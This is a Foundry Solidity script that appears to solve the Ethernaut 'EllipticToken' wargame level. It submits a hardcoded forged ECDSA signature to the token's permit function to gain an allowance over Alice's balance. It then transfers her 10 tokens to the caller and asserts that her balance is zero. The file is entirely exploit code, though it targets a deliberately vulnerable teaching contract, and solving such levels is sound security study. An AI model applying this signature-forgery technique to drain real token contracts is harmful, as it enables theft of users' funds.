pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "test/openzeppelin-ethernaut/EllipticToken.t.sol";

contract EllipticTokenScript is Script {
    function run() external {
        vm.startBroadcast();

        bytes32 r = 0x704c1c655dd38ed98b1701959561845e9d1f62dab5e0add0595d08fff55e8df6;
        bytes32 s = 0x292bd0a2d3b97ba42d9f6db4f12eacdbd6bf6794e4291ee38d6d0e3133003435;
        uint8 v = 27;
        bytes memory forgedSignature = abi.encodePacked(r, s, v);

        address ALICE = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;
        address myAddress = vm.envAddress("MY_ADDRESS");
        uint256 amount = uint256(
            0x0e2dca4570c2694b5e898bb87fb6966b7aefffdb2d064a35a100323eeedb6a66
        );
        bytes32 permitAcceptHash = keccak256(
            abi.encodePacked(ALICE, myAddress, amount)
        );

        (v, r, s) = vm.sign(uint256(vm.envBytes32("PV_KEY")), permitAcceptHash);
        bytes memory spenderSignature = abi.encodePacked(r, s, v);

        EllipticToken instance = EllipticToken(vm.envAddress("ELLIPTIC_TOKEN"));
        instance.permit(amount, myAddress, forgedSignature, spenderSignature);
        instance.transferFrom(ALICE, myAddress, 10 ether);
        require(instance.balanceOf(ALICE) == 0, "failed");

        vm.stopBroadcast();
    }
}
